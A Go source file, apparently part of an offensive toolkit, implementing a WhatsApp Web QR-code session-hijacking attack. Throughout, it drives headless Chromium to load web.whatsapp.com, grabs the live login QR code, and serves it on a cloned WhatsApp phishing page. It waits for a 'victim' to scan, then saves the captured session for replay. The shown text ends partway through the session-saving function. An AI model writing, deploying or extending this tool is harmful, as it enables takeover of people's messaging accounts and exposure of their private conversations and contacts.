package whatsapp

import (
	"bufio"
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/chromedp/chromedp"
	"github.com/chromedp/cdproto/browser"
	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/cdproto/page"
	"github.com/chromedp/cdproto/runtime"
	"programa/utils"
)

const (
	sessionsDir  = "scripts/qr_jacker/whatsapp/sessions"
	wwwDir       = "scripts/qr_jacker/whatsapp/www"
	sessionsFile = "scripts/qr_jacker/whatsapp/sessions.json"
)

var (
	qrCanvasSelector  = "canvas"
	sessionSelector   = "header"
	reloadBtnSelector = "button[aria-label='Scan QR code']"
)

const sessionDetectJS = `!!document.querySelector('header')`

const debugPageStateJS = `
(function() {
	var r = {};
	try { r.url = location.href; } catch(e) {}
	try { r.title = document.title; } catch(e) {}
	try { r.canvasCount = document.querySelectorAll('canvas').length; } catch(e) {}
	try {
		var cs = document.querySelectorAll('canvas');
		for(var i=0;i<cs.length;i++) {
			if(cs[i].offsetParent!==null && cs[i].width>50) r.visibleCanvas = true;
		}
	} catch(e) {}
	try { r.headerCount = document.querySelectorAll('header').length; } catch(e) {}
	try {
		r.bodyPreview = document.body.innerText.substring(0,200).replace(/\\n/g,' ');
	} catch(e) {}
	return JSON.stringify(r);
})()
`

type sessionMeta struct {
	ID        string `json:"id"`
	Timestamp string `json:"timestamp"`
	Browser   string `json:"browser"`
	Profile   string `json:"profile"`
	URL       string `json:"url"`
}

type attackCfg struct {
	Port          int
	Host          string
	BrowserBinary string
}

func Run() {
	reader := bufio.NewReader(os.Stdin)
	for {
		utils.ClearTerminal()
		fmt.Printf("\n%s============ EVIL QR - WHATSAPP ============%s\n\n", utils.Blue, utils.Reset)
		fmt.Printf("%s[1] - Start Attack%s\n", utils.Green, utils.Reset)
		fmt.Printf("%s[2] - List Sessions%s\n", utils.Green, utils.Reset)
		fmt.Printf("%s[3] - Replay Session%s\n", utils.Green, utils.Reset)
		utils.PrintReturnOption("4")

		fmt.Printf("\n%sOption: %s", utils.Green, utils.Reset)
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)

		switch input {
		case "1":
			doAttack(reader)
		case "2":
			listSessions()
			utils.WaitForEnter(reader)
		case "3":
			doReplay(reader)
		case "4":
			return
		default:
			fmt.Printf("%sInvalid option!%s\n", utils.Yellow, utils.Reset)
			utils.WaitForEnter(reader)
		}
	}
}

func doAttack(reader *bufio.Reader) {
	utils.ClearTerminal()
	fmt.Printf("\n%s============ CONFIGURE ATTACK ============%s\n", utils.Blue, utils.Reset)

	browserPath := detectBrowser()
	if browserPath == "" {
		fmt.Printf("%s[!] No supported browser found. Install Chromium, Chrome, or Firefox.%s\n", utils.Red, utils.Reset)
		utils.WaitForEnter(reader)
		return
	}
	browserName := filepath.Base(browserPath)
	fmt.Printf("\n%s[+] Detected browser: %s%s\n", utils.Green, browserName, utils.Reset)

	cfg := attackCfg{
		Port:          8080,
		Host:          "0.0.0.0",
		BrowserBinary: browserPath,
	}

	fmt.Printf("%sUse defaults (port 8080, host 0.0.0.0)? [Y/n]: %s", utils.Green, utils.Reset)
	useDef, _ := reader.ReadString('\n')
	useDef = strings.TrimSpace(strings.ToLower(useDef))
	if useDef == "n" || useDef == "no" {
		fmt.Printf("%sPort [8080]: %s", utils.Green, utils.Reset)
		p, _ := reader.ReadString('\n')
		p = strings.TrimSpace(p)
		if p != "" {
			fmt.Sscanf(p, "%d", &cfg.Port)
		}
		fmt.Printf("%sHost [0.0.0.0]: %s", utils.Green, utils.Reset)
		h, _ := reader.ReadString('\n')
		h = strings.TrimSpace(h)
		if h != "" {
			cfg.Host = h
		}
	}

	launchAttack(cfg)
}

func detectBrowser() string {
	env := os.Getenv("BROWSER")
	if env != "" {
		parts := strings.Fields(env)
		if len(parts) > 0 {
			if path, err := exec.LookPath(parts[0]); err == nil {
				return path
			}
		}
	}

	knownPaths := []string{
		"/usr/bin/zen-browser",
		"/opt/zen/firefox",
		"/usr/bin/firefox",
		"/snap/bin/firefox",
		"/usr/bin/chromium",
		"/usr/bin/google-chrome",
	}
	for _, p := range knownPaths {
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}

	candidates := []string{
		"zen-browser", "zen",
		"firefox", "mozilla-firefox",
		"chromium", "chromium-browser",
		"google-chrome", "google-chrome-stable",
		"chrome", "chrome-browser",
	}
	for _, name := range candidates {
		path, err := exec.LookPath(name)
		if err == nil {
			return path
		}
	}
	return ""
}

func launchAttack(cfg attackCfg) {
	os.MkdirAll(wwwDir, 0755)
	os.MkdirAll(sessionsDir, 0755)

	browserName := strings.ToLower(filepath.Base(cfg.BrowserBinary))
	isGecko := strings.Contains(browserName, "firefox") || strings.Contains(browserName, "zen") || strings.Contains(browserName, "mozilla")
	if isGecko {
		fmt.Printf("%s[!] Attack requires Chromium (CDP). Detected %s uses WebDriver BiDi.%s\n", utils.Yellow, browserName, utils.Reset)
		fmt.Printf("%s[!] Falling back to Chromium if available...%s\n", utils.Yellow, utils.Reset)
		chromiumPath := findChrome()
		if chromiumPath == "" {
			fmt.Printf("%s[!] No Chromium found. Install chromium and try again.%s\n", utils.Red, utils.Reset)
			utils.PauseForInput()
			return
		}
		cfg.BrowserBinary = chromiumPath
	}

	tmpDir, err := os.MkdirTemp("", "whatsapp-attack-*")
	if err != nil {
		fmt.Printf("%s[!] Failed to create temp dir: %v%s\n", utils.Red, err, utils.Reset)
		utils.PauseForInput()
		return
	}
	defer os.RemoveAll(tmpDir)

	allocCtx, allocCancel, err := startChrome(cfg.BrowserBinary, tmpDir)
	if err != nil {
		fmt.Printf("%s[!] Failed to start browser: %v%s\n", utils.Red, err, utils.Reset)
		utils.PauseForInput()
		return
	}
	defer allocCancel()

	tabCtx, tabCancel := chromedp.NewContext(allocCtx)
	defer tabCancel()

	chromedp.Run(tabCtx, network.Enable())

	var (
		consoleErrors    []string
		jsExceptions     []string
		wsCreated        []string
		wsClosed         []string
		wsErrors         []string
		wsFramesSent     int
		wsFramesRecv     int
		networkFailures  []string
		requestURLs      map[network.RequestID]string
		lastReconnect    time.Time
		reconnectCount   int
		diagMu           sync.Mutex
	)
	requestURLs = make(map[network.RequestID]string)
	diagLog := func(label, msg string) {
		diagMu.Lock()
		fmt.Printf("\n%s[%s] %s%s", utils.Yellow, label, msg, utils.Reset)
		diagMu.Unlock()
	}

	chromedp.ListenTarget(tabCtx, func(ev interface{}) {
		switch e := ev.(type) {
		case *runtime.EventConsoleAPICalled:
			var args []string
			for _, a := range e.Args {
				s := fmt.Sprintf("%v", a)
				if len(s) > 300 {
					s = s[:300]
				}
				args = append(args, s)
			}
			line := fmt.Sprintf("[%s] %s", e.Type, strings.Join(args, " | "))
			if e.Type == "error" {
				diagMu.Lock()
				consoleErrors = append(consoleErrors, line)
				diagMu.Unlock()
			}
			if e.Type == "error" || e.Type == "warning" || e.Type == "info" {
				diagLog(fmt.Sprintf("CONSOLE-%s", e.Type), strings.Join(args, " "))
			}

		case *runtime.EventExceptionThrown:
			if e.ExceptionDetails != nil {
				text := e.ExceptionDetails.Error()
				diagMu.Lock()
				jsExceptions = append(jsExceptions, text)
				diagMu.Unlock()
				diagLog("EXCEPTION", text)
			}

		case *network.EventWebSocketCreated:
			info := fmt.Sprintf("url=%s requestId=%s", e.URL, e.RequestID)
			diagMu.Lock()
			wsCreated = append(wsCreated, info)
			if !lastReconnect.IsZero() {
				interval := time.Since(lastReconnect).Round(time.Second)
				fmt.Printf("\n%s[WS-RECONNECT] after %s (count=%d)%s", utils.Yellow, interval, reconnectCount, utils.Reset)
			}
			lastReconnect = time.Now()
			reconnectCount++
			diagMu.Unlock()
			diagLog("WS-CREATED", info)

		case *network.EventWebSocketWillSendHandshakeRequest:
			diagLog("WS-HANDSHAKE", fmt.Sprintf("requestId=%s", e.RequestID))

		case *network.EventWebSocketHandshakeResponseReceived:
			diagLog("WS-HANDSHAKE-RESP", fmt.Sprintf("requestId=%s status=%d", e.RequestID, e.Response.Status))

		case *network.EventWebSocketFrameSent:
			diagMu.Lock()
			wsFramesSent++
			diagMu.Unlock()

		case *network.EventWebSocketFrameReceived:
			diagMu.Lock()
			wsFramesRecv++
			diagMu.Unlock()

		case *network.EventWebSocketFrameError:
			msg := fmt.Sprintf("requestId=%s errorMessage=%s", e.RequestID, e.ErrorMessage)
			diagMu.Lock()
			wsErrors = append(wsErrors, msg)
			diagMu.Unlock()
			diagLog("WS-ERROR", msg)

		case *network.EventWebSocketClosed:
			info := fmt.Sprintf("requestId=%s", e.RequestID)
			diagMu.Lock()
			wsClosed = append(wsClosed, info)
			diagMu.Unlock()
			diagLog("WS-CLOSED", info)

		case *network.EventLoadingFailed:
			url := requestURLs[e.RequestID]
			fail := fmt.Sprintf("requestId=%s url=%s type=%s error=%s blockedReason=%s canceled=%v", e.RequestID, url, e.Type, e.ErrorText, e.BlockedReason, e.Canceled)
			diagMu.Lock()
			networkFailures = append(networkFailures, fail)
			diagMu.Unlock()
			diagLog("NET-FAIL", fail)

		case *network.EventRequestWillBeSent:
			diagMu.Lock()
			requestURLs[e.RequestID] = e.Request.URL
			diagMu.Unlock()
		}
	})

	chromedp.Run(tabCtx, chromedp.ActionFunc(func(ctx context.Context) error {
		_, err := page.AddScriptToEvaluateOnNewDocument(`
		window.__diag = { onerror: [], unhandled: [], idbErrors: [], sbErrors: [] };
		window.onerror = function(msg, src, line, col, err) {
			window.__diag.onerror.push({msg:msg, src:src, line:line, col:col, stack:err && err.stack});
		};
		window.addEventListener('unhandledrejection', function(e) {
			window.__diag.unhandled.push({reason:String(e.reason), stack:e.reason && e.reason.stack});
		});
		try {
			if (navigator.storage) {
				navigator.storage.persist = function() { return Promise.resolve(true); };
			}
			navigator.storageBuckets = {
				open: function(name, opts) {
					var bucket = {
						name: name,
						persisted: opts && opts.persisted ? true : false,
						persist: function() { return Promise.resolve(true); },
						persisted: function() { return Promise.resolve(this.persisted); },
						estimate: function() { return Promise.resolve({quota: 10*1024*1024, usage: 0}); }
					};
					return Promise.resolve(bucket);
				},
				keys: function() { return Promise.resolve([]); }
			};
		} catch(e) {
			window.__diag.sbErrors.push(String(e));
		}
		`).Do(ctx)
		return err
	}))

	if err := chromedp.Run(tabCtx, chromedp.Navigate("https://web.whatsapp.com")); err != nil {
		fmt.Printf("%s[!] Navigation failed: %v%s\n", utils.Red, err, utils.Reset)
		utils.PauseForInput()
		return
	}
	fmt.Printf("%s[+] Loading web.whatsapp.com...%s\n", utils.Green, utils.Reset)

	chromedp.Run(tabCtx, browser.SetPermission(&browser.PermissionDescriptor{Name: "persistent-storage"}, browser.PermissionSettingGranted).WithOrigin("https://web.whatsapp.com"))
	chromedp.Run(tabCtx, browser.SetPermission(&browser.PermissionDescriptor{Name: "durable-storage"}, browser.PermissionSettingGranted).WithOrigin("https://web.whatsapp.com"))

	var ready string
	for i := 0; i < 60; i++ {
		chromedp.Run(tabCtx, chromedp.Evaluate(`document.readyState`, &ready))
		if ready == "complete" {
			break
		}
		time.Sleep(500 * time.Millisecond)
	}

	fmt.Printf("%s[+] Page loaded (readyState=%s)%s\n", utils.Green, ready, utils.Reset)

	var diagInfo string
	chromedp.Run(tabCtx, chromedp.Evaluate(`JSON.stringify(window.__diag)`, &diagInfo))
	fmt.Printf("\n%s========== DIAGNOSTICS AFTER LOAD ==========%s\n", utils.Blue, utils.Reset)
	fmt.Printf("window.__diag: %s\n", diagInfo)

	var swInfo string
	chromedp.Run(tabCtx, chromedp.Evaluate(`
		(function() {
			if (!navigator.serviceWorker.controller) return 'no SW controller';
			return 'SW state: ' + navigator.serviceWorker.controller.state;
		})()
	`, &swInfo))
	fmt.Printf("ServiceWorker: %s\n", swInfo)

	var lsCheck bool
	chromedp.Run(tabCtx, chromedp.Evaluate(`!!window.localStorage`, &lsCheck))
	fmt.Printf("localStorage: %v\n", lsCheck)

	var ssCheck bool
	chromedp.Run(tabCtx, chromedp.Evaluate(`!!window.sessionStorage`, &ssCheck))
	fmt.Printf("sessionStorage: %v\n", ssCheck)

	var hasSB bool
	chromedp.Run(tabCtx, chromedp.Evaluate(`!!navigator.storageBuckets`, &hasSB))
	fmt.Printf("navigator.storageBuckets: %v\n", hasSB)

	var idbErr string
	chromedp.Run(tabCtx, chromedp.Evaluate(`
		(function() {
			var r = indexedDB.databases ? 'available' : 'not available';
			try { indexedDB.databases().then(function(dbs) { window.__idbDbs = dbs.map(function(d) { return d.name; }); }).catch(function(e) { window.__idbDbs = 'error: ' + e; }); } catch(e) { window.__idbDbs = 'exception: ' + e; }
			return r;
		})()
	`, &idbErr))
	fmt.Printf("IndexedDB.databases: %s\n", idbErr)

	time.Sleep(3 * time.Second)
	var idbDbs string
	chromedp.Run(tabCtx, chromedp.Evaluate(`JSON.stringify(window.__idbDbs)`, &idbDbs))
	fmt.Printf("IndexedDB databases: %s\n", idbDbs)

	var cryptoSubtle, cryptoGetRandom, storagePersist, storageEstimate bool
	chromedp.Run(tabCtx, chromedp.Evaluate(`!!(window.crypto && window.crypto.subtle)`, &cryptoSubtle))
	chromedp.Run(tabCtx, chromedp.Evaluate(`!!(window.crypto && window.crypto.getRandomValues)`, &cryptoGetRandom))
	chromedp.Run(tabCtx, chromedp.Evaluate(`!!(navigator.storage && navigator.storage.persist)`, &storagePersist))
	chromedp.Run(tabCtx, chromedp.Evaluate(`!!(navigator.storage && navigator.storage.estimate)`, &storageEstimate))
	fmt.Printf("crypto.subtle: %v | getRandomValues: %v | storage.persist: %v | storage.estimate: %v\n",
		cryptoSubtle, cryptoGetRandom, storagePersist, storageEstimate)

	diagMu.Lock()
	fmt.Printf("\nWebSocket connections created: %d\n", len(wsCreated))
	for _, w := range wsCreated {
		fmt.Printf("  CREATED: %s\n", w)
	}
	fmt.Printf("WebSocket closed: %d\n", len(wsClosed))
	for _, w := range wsClosed {
		fmt.Printf("  CLOSED: %s\n", w)
	}
	fmt.Printf("WebSocket errors: %d\n", len(wsErrors))
	for _, w := range wsErrors {
		fmt.Printf("  ERROR: %s\n", w)
	}
	fmt.Printf("Frames sent: %d received: %d\n", wsFramesSent, wsFramesRecv)
	fmt.Printf("Network failures: %d\n", len(networkFailures))
	for _, nf := range networkFailures {
		fmt.Printf("  FAIL: %s\n", nf)
	}
	fmt.Printf("Console errors: %d\n", len(consoleErrors))
	for _, ce := range consoleErrors {
		fmt.Printf("  CE: %s\n", ce)
	}
	fmt.Printf("JS exceptions: %d\n", len(jsExceptions))
	for _, je := range jsExceptions {
		fmt.Printf("  EXC: %s\n", je)
	}
	diagMu.Unlock()
	fmt.Printf("\n%s==============================================%s\n\n", utils.Blue, utils.Reset)

	var currentQR []byte
	var qrMu sync.Mutex

	addrCh := make(chan string, 1)
	serverDone := make(chan struct{})
	go runServer(cfg.Host, cfg.Port, &qrMu, &currentQR, addrCh, serverDone)

	select {
	case actualAddr := <-addrCh:
		cfg.Host, cfg.Port = parseAddr(actualAddr)
	case <-time.After(3 * time.Second):
		fmt.Printf("%s[!] Server failed to start%s\n", utils.Red, utils.Reset)
		utils.PauseForInput()
		return
	}

	ip := utils.GetLocalIP()
	attackURL := fmt.Sprintf("http://%s:%d", ip, cfg.Port)
	localURL := fmt.Sprintf("http://127.0.0.1:%d", cfg.Port)

	fmt.Printf("\n%s[+] Server: %s%s\n", utils.Green, attackURL, utils.Reset)
	fmt.Printf("%s[+] Local:  %s%s\n", utils.Green, localURL, utils.Reset)
	fmt.Printf("%s[+] Open %s in your browser manually%s\n", utils.Yellow, localURL, utils.Reset)
	fmt.Printf("%s[+] Waiting for victim to scan the QR code...\n\n%s", utils.Yellow, utils.Reset)

	start := time.Now()
	timeout := 10 * time.Minute
	sessionCaptured := false
	var qrSaved bool
	var lastFrameCheck time.Time
	var lastSent, lastRecv int

	for time.Since(start) < timeout {
		select {
		case <-serverDone:
			return
		default:
		}

		captureQR(tabCtx, &qrMu, &currentQR)

		if !qrSaved {
			qrMu.Lock()
			if len(currentQR) > 500 {
				os.MkdirAll(wwwDir, 0755)
				os.WriteFile(filepath.Join(wwwDir, "debug_qr.png"), currentQR, 0644)
				qrSaved = true
				fmt.Printf("%s[+] QR saved to %s/debug_qr.png (size: %d bytes)%s\n", utils.Green, wwwDir, len(currentQR), utils.Reset)
			}
			qrMu.Unlock()
		}

		var dummy string
		var reloadExists bool
		chromedp.Run(tabCtx, chromedp.Evaluate(
			fmt.Sprintf(`!!document.querySelector('%s')`, reloadBtnSelector), &reloadExists))
		if reloadExists {
			chromedp.Run(tabCtx, chromedp.Evaluate(
				fmt.Sprintf(`(()=>{const b=document.querySelector('%s');if(b)b.click()})()`, reloadBtnSelector), &dummy))
		}

		var hasSession bool
		err := chromedp.Run(tabCtx, chromedp.Evaluate(sessionDetectJS, &hasSession))
		if err != nil {
			fmt.Printf("%s[!] Session check error: %v%s\n", utils.Red, err, utils.Reset)
		}
		if hasSession {
			fmt.Printf("\n%s[+] SESSION CAPTURED! Victim scanned the QR code!%s\n", utils.Green, utils.Reset)
			sessionCaptured = true
			break
		}

		if time.Since(start).Seconds() > 3 {
			var pageState string
			if err := chromedp.Run(tabCtx, chromedp.Evaluate(debugPageStateJS, &pageState)); err == nil && len(pageState) > 0 {
				fmt.Printf("\r%s[%s] %s%s", utils.Yellow, time.Since(start).Round(time.Second), pageState, utils.Reset)
			} else {
				fmt.Printf("\r%s[%s] eval error: %v        %s", utils.Yellow, time.Since(start).Round(time.Second), err, utils.Reset)
			}
		}

		if time.Since(lastFrameCheck) > 10*time.Second {
			diagMu.Lock()
			newSent := wsFramesSent - lastSent
			newRecv := wsFramesRecv - lastRecv
			lastSent = wsFramesSent
			lastRecv = wsFramesRecv
			wsCount := len(wsCreated)
			wsClosedCount := len(wsClosed)
			diagMu.Unlock()
			fmt.Printf("\n%s[NET] WS frames: +%d sent / +%d recv | total created=%d closed=%d%s\n",
				"\033[36m", newSent, newRecv, wsCount, wsClosedCount, utils.Reset)
			lastFrameCheck = time.Now()
		}

		time.Sleep(time.Second)
	}

	close(serverDone)

	if sessionCaptured {
		saveSession(tmpDir, "chromium", "https://web.whatsapp.com")
	} else {
		fmt.Printf("\n%s[!] No session captured within timeout.%s\n", utils.Yellow, utils.Reset)

		var diagOut string
		chromedp.Run(tabCtx, chromedp.Evaluate(`JSON.stringify(window.__diag)`, &diagOut))
		fmt.Printf("\n%s========== FINAL DIAGNOSTICS (TIMEOUT) ==========%s\n", utils.Blue, utils.Reset)
		fmt.Printf("window.__diag: %s\n", diagOut)
		diagMu.Lock()
		fmt.Printf("WS frames: %d sent / %d recv | errors: %d | closed: %d\n", wsFramesSent, wsFramesRecv, len(wsErrors), len(wsClosed))
		for _, we := range wsErrors {
			fmt.Printf("  WS ERROR: %s\n", we)
		}
		fmt.Printf("Network failures: %d\n", len(networkFailures))
		for _, nf := range networkFailures {
			fmt.Printf("  FAIL: %s\n", nf)
		}
		fmt.Printf("Console errors: %d\n", len(consoleErrors))
		for _, ce := range consoleErrors {
			fmt.Printf("  CE: %s\n", ce)
		}
		diagMu.Unlock()
		fmt.Printf("\n%s=========================================================%s\n", utils.Blue, utils.Reset)
		var ss []byte
		if err := chromedp.Run(tabCtx, chromedp.FullScreenshot(&ss, 90)); err == nil && len(ss) > 0 {
			os.MkdirAll(wwwDir, 0755)
			os.WriteFile(filepath.Join(wwwDir, "debug_timeout.png"), ss, 0644)
			fmt.Printf("%s[+] Timeout screenshot saved to %s/debug_timeout.png%s\n", utils.Green, wwwDir, utils.Reset)
		}
	}

	utils.PauseForInput()
}

func captureQR(tabCtx context.Context, qrMu *sync.Mutex, currentQR *[]byte) {
	var dataURL string
	err := chromedp.Run(tabCtx, chromedp.Evaluate(`
		(() => {
			const canvases = document.querySelectorAll('canvas');
			let best = null;
			for (const c of canvases) {
				if (c.width > 50 && c.height > 50 && c.offsetParent !== null) {
					if (!best || (c.width > best.width && c.height > best.height)) best = c;
				}
			}
			if (!best) return '';
			try { return best.toDataURL('image/png'); } catch(e) { return ''; }
		})()
	`, &dataURL))

	if err == nil && len(dataURL) > 100 {
		b64 := strings.TrimPrefix(dataURL, "data:image/png;base64,")
		decoded, decErr := base64.StdEncoding.DecodeString(b64)
		if decErr == nil && len(decoded) > 500 && isPNG(decoded) {
			qrMu.Lock()
			changed := len(*currentQR) > 0 && !bytes.Equal(*currentQR, decoded)
			*currentQR = decoded
			qrMu.Unlock()
			if changed {
				fmt.Printf("%s[!] QR changed%s\n", utils.Blue, utils.Reset)
			}
			return
		}
	}

	var qrScreenshot []byte
	err = chromedp.Run(tabCtx, chromedp.Screenshot(`canvas`, &qrScreenshot, chromedp.NodeVisible, chromedp.ByQueryAll))
	if err == nil && len(qrScreenshot) > 500 && isPNG(qrScreenshot) {
		qrMu.Lock()
		*currentQR = qrScreenshot
		qrMu.Unlock()
		return
	}

	var fullPage []byte
	err = chromedp.Run(tabCtx, chromedp.FullScreenshot(&fullPage, 90))
	if err == nil && len(fullPage) > 2000 {
		os.WriteFile(filepath.Join(wwwDir, "debug_fullpage.png"), fullPage, 0644)
	}
}

func isPNG(b []byte) bool {
	return len(b) > 8 && b[0] == 137 && b[1] == 80 && b[2] == 78 && b[3] == 71
}

func findChrome() string {
	candidates := []string{"chromium", "chromium-browser", "google-chrome", "google-chrome-stable", "chrome"}
	for _, name := range candidates {
		path, err := exec.LookPath(name)
		if err == nil {
			return path
		}
	}
	paths := []string{"/usr/bin/chromium", "/usr/bin/google-chrome"}
	for _, p := range paths {
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	return ""
}

func startChrome(binary, userDir string) (context.Context, context.CancelFunc, error) {
	opts := []chromedp.ExecAllocatorOption{
		chromedp.NoSandbox,
		chromedp.Flag("headless", "new"),
		chromedp.Flag("disable-dev-shm-usage", true),
		chromedp.Flag("no-first-run", true),
		chromedp.Flag("disable-extensions", true),
		chromedp.Flag("hide-scrollbars", true),
		chromedp.Flag("mute-audio", true),
		chromedp.Flag("disable-blink-features", "AutomationControlled,StorageBuckets"),
		chromedp.Flag("disable-background-timer-throttling", true),
		chromedp.Flag("disable-renderer-backgrounding", true),
		chromedp.Flag("disable-backgrounding-occluded-windows", true),
		chromedp.Flag("lang", "en"),
		chromedp.WindowSize(1920, 1080),
		chromedp.UserAgent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"),
		chromedp.UserDataDir(userDir),
	}
	if binary != "" {
		opts = append(opts, chromedp.ExecPath(binary))
	}
	allocCtx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
	return allocCtx, cancel, nil
}

func runServer(host string, port int, qrMu *sync.Mutex, currentQR *[]byte, addrCh chan<- string, done chan struct{}) {
	mux := http.NewServeMux()

	phishingHTML := `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>WhatsApp Web</title><style>*{margin:0;padding:0;box-sizing:border-box}html,body{height:100%}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;flex-direction:column;overflow:hidden;color:#41525d}.top-bar{background:#00a884;height:6px;flex-shrink:0}.main{flex:1;display:flex;align-items:center;justify-content:center;padding:24px}.card{background:#fff;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,0.06);display:flex;flex-direction:row;max-width:1000px;width:100%;min-height:520px;overflow:hidden}.left{flex:1.1;padding:56px 48px;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center}.left .logo{margin-bottom:16px}.left .logo svg{width:48px;height:48px}.left h1{font-size:28px;font-weight:275;color:#41525d;margin-bottom:10px;letter-spacing:-0.3px}.left .sub{font-size:15px;color:#667781;line-height:1.5;max-width:300px;margin-bottom:28px}.left .steps-wrap{background:#f9fafb;border-radius:12px;padding:20px 24px;text-align:left;width:100%;max-width:320px}.left .steps-wrap .step{display:flex;align-items:flex-start;gap:12px;margin-bottom:14px;font-size:14px;color:#3b4a54;line-height:1.5}.left .steps-wrap .step:last-child{margin-bottom:0}.left .steps-wrap .num{background:#00a884;color:#fff;border-radius:50%;width:22px;height:22px;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:600;flex-shrink:0;margin-top:1px}.left .steps-wrap .step strong{color:#1f2a30}.right{flex:1;background:#fcfdfd;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:48px 40px;border-left:1px solid #e9edef;position:relative}.right .qr-label{font-size:13px;color:#8696a0;margin-bottom:14px;text-transform:uppercase;letter-spacing:1px}.right .qr-border{border:3px solid #00a884;border-radius:16px;padding:12px;background:#fff;box-shadow:0 1px 6px rgba(0,168,132,0.12);margin-bottom:18px}.right .qr-border img{display:block;width:240px;height:240px;border-radius:4px}.right .qr-border .placeholder{width:240px;height:240px;display:flex;align-items:center;justify-content:center;background:#f8f9fa;border-radius:4px;color:#a0acb5;font-size:13px}.right .actions{display:flex;gap:10px;margin-top:4px}.right .actions a{display:inline-block;padding:8px 22px;border-radius:24px;font-size:13px;text-decoration:none;cursor:pointer;transition:all .15s}.right .actions .refresh{background:#00a884;color:#fff;border:none;font-weight:500}.right .actions .refresh:hover{background:#009972}.right .actions .link{background:transparent;color:#00a884;border:1px solid #d9dee0}.right .actions .link:hover{background:#f0faf8}.footer{text-align:center;padding:18px;font-size:12px;color:#8696a0;background:#f0f2f5;flex-shrink:0;border-top:1px solid #e9edef}.footer a{color:#00a884;text-decoration:none;margin:0 10px}.footer a:hover{text-decoration:underline}@media(max-width:800px){.card{flex-direction:column-reverse;min-height:auto;border-radius:0}.left,.right{padding:28px 20px;border-left:none}.left .steps-wrap{max-width:100%}.right .qr-border img{width:200px;height:200px}.right .qr-border .placeholder{width:200px;height:200px}}@media(max-width:480px){.main{padding:0}.card{box-shadow:none}.left h1{font-size:22px}}</style></head><body><div class="top-bar"></div><div class="main"><div class="card"><div class="left"><div class="logo"><svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><path fill="#00a884" d="M24 0C10.8 0 0 10.8 0 24c0 4.8 1.4 9.2 3.8 13L1.2 46.8 12 43.2c3.6 2 7.8 3.2 12 3.2 13.2 0 24-10.8 24-24S37.2 0 24 0z"/><path fill="#fff" d="M33.6 28.8c-.6-.3-3.6-1.8-4.2-2-.6-.2-1-.3-1.4.3-.4.6-1.6 2-2 2.4-.4.4-.8.4-1.4.1-.6-.3-2.4-.9-4.6-2.8-1.7-1.5-2.8-3.3-3.2-3.9-.3-.6 0-.9.3-1.2.3-.3.6-.6.8-.9.3-.3.4-.6.6-.9.2-.3.1-.6-.1-.9-.2-.3-1.4-3.4-1.9-4.6-.5-1.2-1-1-1.4-1-.4 0-.8-.1-1.2-.1-.4 0-1.1.2-1.7.8-.6.6-2.2 2.2-2.2 5.3s2.2 6.2 2.6 6.6c.3.4 4.4 7 10.8 9.6 1.5.6 2.7 1 3.6 1.3 1.5.5 2.9.4 4 .3 1.2-.1 3.8-1.5 4.3-3 .5-1.4.5-2.6.4-2.9-.2-.3-.6-.5-1.1-.8z"/></svg></div><h1>Use WhatsApp on your computer</h1><p class="sub">To use WhatsApp on your computer, scan this QR code with your phone.</p><div class="steps-wrap"><div class="step"><span class="num">1</span><span>Open <strong>WhatsApp</strong> on your phone</span></div><div class="step"><span class="num">2</span><span>Tap <strong>Menu</strong> or <strong>Settings</strong> and select <strong>Linked Devices</strong></span></div><div class="step"><span class="num">3</span><span>Point your phone at this screen</span></div></div></div><div class="right"><div class="qr-label">Scan QR Code</div><div class="qr-border"><img id="qr" src="/qr.png" alt="QR Code" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"><div class="placeholder" style="display:none">Loading QR code…</div></div><div class="actions"><a class="link" href="#">Keep QR visible</a><a class="refresh" href="#" onclick="document.getElementById('qr').src='/qr.png?t='+Date.now()">Refresh</a></div></div></div></div><div class="footer"><a href="#">Get WhatsApp for Windows</a><a href="#">Tutorial</a><a href="#">Privacy Policy</a></div><script>setInterval(function(){var e=document.getElementById('qr');e.src='/qr.png?t='+Date.now()},4000)</script></body></html>`

	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
		w.Write([]byte(phishingHTML))
	})

	mux.HandleFunc("/qr.png", func(w http.ResponseWriter, r *http.Request) {
		qrMu.Lock()
		data := make([]byte, len(*currentQR))
		copy(data, *currentQR)
		qrMu.Unlock()
		if len(data) == 0 {
			w.Header().Set("Content-Type", "text/plain")
			w.Header().Set("Cache-Control", "no-cache")
			w.WriteHeader(http.StatusNotFound)
			w.Write([]byte("QR not available yet"))
			return
		}
		w.Header().Set("Content-Type", "image/png")
		w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
		w.Header().Set("Pragma", "no-cache")
		w.Header().Set("Expires", "0")
		w.Write(data)
	})

	addr := fmt.Sprintf("%s:%d", host, port)
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		listener, err = net.Listen("tcp", ":0")
		if err != nil {
			fmt.Printf("%s[!] Failed to start HTTP server: %v%s\n", utils.Red, err, utils.Reset)
			addrCh <- ""
			return
		}
	}
	addrCh <- listener.Addr().String()

	srv := &http.Server{Handler: mux}
	go func() {
		<-done
		srv.Close()
	}()
	srv.Serve(listener)
}

func parseAddr(addr string) (string, int) {
	host, portStr, err := net.SplitHostPort(addr)
	if err != nil {
		return "0.0.0.0", 8080
	}
	port := 8080
	fmt.Sscanf(portStr, "%d", &port)
	return host, port
}

func saveSession(profileDir, browser, url string) {
	os.MkdirAll(sessionsDir, 0755)
